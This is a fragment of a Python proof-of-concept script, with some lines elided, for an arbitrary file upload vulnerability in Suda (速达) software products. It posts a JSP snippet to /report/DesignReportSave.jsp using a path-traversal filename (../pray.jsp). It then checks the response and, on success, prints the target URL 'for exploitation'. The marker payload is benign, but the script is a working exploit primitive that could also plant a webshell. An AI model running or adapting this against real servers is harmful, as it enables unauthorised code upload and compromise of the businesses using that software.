  ...
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                     ░                                                        
                                            author:pray
                                            version:1.0.0
                                            BY:速达软件全系产品存在任意文件上传漏洞
"""
    print(banner)

# poc模块
def poc(target):
    url = target+"/report/DesignReportSave.jsp?report=../pray.jsp"
    headers = {
    ...
    data=('<% out.print("aaaa");%>')
    try:
        res = requests.post(url=url,headers=headers,verify=False,timeout=10,data=str(data))
        if res.status_code == 200:
            ...
            if "aaaa" in res.text:
                print("[+]"+target+"存在漏洞,请访问"+url+"进行利用")
